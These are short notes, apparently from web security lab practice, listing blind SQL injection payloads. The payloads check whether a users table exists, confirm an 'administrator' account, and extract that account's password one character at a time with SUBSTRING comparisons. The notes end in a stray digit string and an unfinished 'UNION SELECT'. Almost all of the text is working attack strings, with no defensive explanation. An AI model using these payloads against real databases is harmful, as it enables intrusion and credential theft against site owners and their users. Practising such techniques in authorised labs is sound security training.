--To check if there is table users in the db--
'and (SELECT 'a' FROM users LIMIT 1)='a'--

--To check the column name and the content--
(can be user, can be username)
'and (SELECT 'a' FROM users WHERE username='administrator')='a'--

--To check the password of the administrator--
'and (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='n'--

12345678901234567890


UNION SELECT 